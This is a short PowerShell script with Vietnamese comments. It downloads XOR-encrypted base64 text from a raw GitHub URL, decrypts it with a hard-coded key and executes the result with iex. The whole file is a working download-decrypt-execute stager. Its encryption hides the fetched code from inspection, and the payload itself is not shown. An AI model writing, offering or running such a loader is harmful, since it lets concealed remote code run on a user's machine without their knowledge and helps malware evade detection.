# Định nghĩa hàm XOR-Decryption
function XOR-Decryption {
    param (
        [string]$inputString,
        [string]$key
    )

    $inputBytes = [System.Convert]::FromBase64String($inputString)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    $outputBytes = [byte[]]@()

    for ($i = 0; $i -lt $inputBytes.Length; $i++) {
        $outputBytes += [byte]($inputBytes[$i] -bxor $keyBytes[$i % $keyBytes.Length])
    }

    return [System.Text.Encoding]::UTF8.GetString($outputBytes)
}

# Tải và giải mã nội dung
$encryptedText = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Ilovecodepython/Xor-test/main/content.txt" -UseBasicParsing
$key = "secretkey"
$decryptedContent = XOR-Decryption -inputString $encryptedText.Content -key $key

# Thực thi nội dung giải mã
iex $decryptedContent
